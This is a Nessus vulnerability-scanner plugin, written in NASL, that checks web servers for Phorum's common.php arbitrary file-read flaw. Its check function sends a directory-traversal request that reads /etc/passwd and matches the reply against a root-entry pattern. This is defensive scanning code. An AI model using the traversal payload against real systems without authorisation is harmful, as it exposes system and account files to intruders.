#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10593);
 script_version ("$Revision: 1.11 $");
 script_bugtraq_id(1985);
 name["english"] = "phorum's common.cgi";
 name["francais"] = "phorum's common.cgi";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "The CGI script 'common.php', which
comes with phorum, is installed. This CGI has
a well known security flaw that lets an attacker read arbitrary
files with the privileges of the http daemon (usually root or nobody).

Solution : remove it
Risk factor : Serious";



 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for the presence of common.cgi";
 summary["francais"] = "Vérifie la présence de common.cgi";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

function check(prefix)
{
  req = http_get(item:string(prefix, "?f=0&ForumLang=../../../../../../../etc/passwd"),
  		 port:port);
  buf = http_keepalive_send_recv(port:port, data:req);
  if( buf == NULL ) exit(0);
  
  if(egrep(pattern:".*root:.*:0:[01]:.*", string:buf)) {
  	security_hole(port);
	exit(0);
	}
}

port = get_kb_item("Services/www");
if(!port) port = 80;
if(!get_port_state(port))exit(0);



foreach dir (make_list("", cgi_dirs()))
{
check(prefix:string(dir, "/support/common.php"));
check(prefix:string(dir, "/common.php"));
}
